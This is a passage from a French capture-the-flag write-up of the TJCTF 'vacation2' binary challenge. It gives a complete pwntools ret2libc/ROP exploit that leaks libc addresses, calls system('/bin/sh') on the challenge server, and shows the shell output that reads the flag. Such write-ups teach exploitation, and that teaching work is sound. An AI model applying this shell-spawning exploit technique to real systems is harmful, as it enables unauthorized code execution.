+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;0x&#39;</span><span style="color:#ff79c6">+</span>Leaked_puts,<span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
+</span></span></code></pre></div><p>On peut vérifier que l&rsquo;adresse est valide car elle se termine par <code>000</code> qui indique que l&rsquo;adresse est valide !
+Nous touchons au but :)</p>
+<p>On peut donc aller chercher les adresses de</p>
+<ul>
+<li>&ldquo;/bin/sh&rdquo;</li>
+<li>la fonction <code>system</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>bin_sh <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>system <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">    Address:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] System  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(system))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] bin_sh  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(bin_sh))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Pop_rdi : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(pop_rdi))
+</span></span></code></pre></div><p>Enfin , on crée notre payload final pour appeler <strong>/bin/sh</strong> dans la fonction system et ainsi avoir un shell intéractif !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Getting Shell ...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span><span style="color:#ff79c6">*</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">+</span> p64(ret) <span style="color:#ff79c6">+</span>p64(pop_rdi) <span style="color:#ff79c6">+</span> p64(bin_sh) <span style="color:#ff79c6">+</span> p64(system) <span style="color:#ff79c6">+</span> p64(ret_main_addr)
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>sendline(rop)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><p>Voici le script final :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf  <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./vacation2&#39;</span>)
+</span></span><span style="display:flex;"><span>rop  <span style="color:#ff79c6">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;libc6_2.31-0ubuntu9.7_amd64.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">not</span> args<span style="color:#ff79c6">.</span>REMOTE):
+</span></span><span style="display:flex;"><span>	libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;libc6_2.33.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Get_proc</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span>(args<span style="color:#ff79c6">.</span>REMOTE):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#39;tjc.tf&#39;</span>,<span style="color:#bd93f9">31705</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>		proc <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./vacation2&#39;</span>)
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Where am I going today?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> proc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Leak_function</span>(name,proc):
+</span></span><span style="display:flex;"><span>	payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span><span style="color:#ff79c6">*</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">+</span> p64(pop_rdi) <span style="color:#ff79c6">+</span> p64(elf<span style="color:#ff79c6">.</span>got[name]) <span style="color:#ff79c6">+</span> p64(libc_puts_plt)<span style="color:#ff79c6">+</span> p64(ret_main_addr)
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>	Leaked	<span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>recvline()[::<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>hex()
+</span></span><span style="display:flex;"><span>	proc<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Where am I going today?</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> Leaked
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">## Adress</span>
+</span></span><span style="display:flex;"><span>ret_main_addr	<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;vacation&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_puts_plt	<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>plt[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_fgets		<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;fgets&#39;</span>]
+</span></span><span style="display:flex;"><span>libc_setbuf		<span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;setbuf&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000401243</span>
+</span></span><span style="display:flex;"><span>ret 	<span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x000000000040101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">    Address:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Ret2start   : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(ret_main_addr))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Puts        : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_puts_plt))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Fgets       : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_fgets))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Setbuf      : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc_setbuf))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Pop_rdi     : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(pop_rdi))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Ret         : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(ret))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#ff79c6">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Leaked_puts	 <span style="color:#ff79c6">=</span> Leak_function(<span style="color:#f1fa8c">&#34;puts&#34;</span>,proc)
+</span></span><span style="display:flex;"><span>Leaked_fgets <span style="color:#ff79c6">=</span> Leak_function(<span style="color:#f1fa8c">&#34;fgets&#34;</span>,proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;    Leaked with Rop:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Puts  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span>Leaked_puts)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Fgets : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span>Leaked_fgets)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">## Relocate libc</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#f1fa8c">&#39;0x&#39;</span><span style="color:#ff79c6">+</span>Leaked_puts,<span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address))[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>:] <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;000&#39;</span>):
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[-] Invalid Libc: </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">## New Adress</span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>system <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">    Address:&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] System  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(system))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] bin_sh  : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(bin_sh))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Pop_rdi : </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">%</span><span style="color:#8be9fd;font-style:italic">hex</span>(pop_rdi))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;[+] Getting Shell ...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">## Create Rop</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span><span style="color:#ff79c6">*</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">+</span> p64(ret) <span style="color:#ff79c6">+</span>p64(pop_rdi) <span style="color:#ff79c6">+</span> p64(bin_sh) <span style="color:#ff79c6">+</span> p64(system) <span style="color:#ff79c6">+</span> p64(ret_main_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>sendline(rop)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span>proc<span style="color:#ff79c6">.</span>close()
+</span></span></code></pre></div><p>et voici le Résultat :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   python3 vacation2.py REMOTE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Address:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Ret2start   : 0x401176
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Puts        : 0x401064
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Fgets       : 0x401084
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Setbuf      : 0x401074
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Pop_rdi     : 0x401243
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Ret         : 0x40101a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Leaked with Rop:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Puts  : 7f328beea450
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Fgets : 7f328bee8660
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Address:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> System  : 0x7f328beb82c0
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> bin_sh  : 0x7f328c01a5bd
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Pop_rdi : 0x401243
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Getting Shell ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1000</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1000</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">1000</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>run
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>tjctf<span style="color:#ff79c6">{</span>w3_g0_wher3_w3_w4nt_t0!_66f7020620e343ff<span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p><em>(source:<a href="https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address/rop-leaking-libc-template"  target="_blank" rel="noopener" >hacktricks</a>)</em></p>
+<p>Voila ! C&rsquo;était ma première exploitation Ropchain ainsi que Ret2libc et j&rsquo;espère que ma solution vous a plu.</p>
+
+  </article>
+
+</div>
+
+
+  </div>
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3EGPCQCHEK"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-3EGPCQCHEK', { 'anonymize_ip': false });
+}
+</script>
+
+</body>
+
+</html>
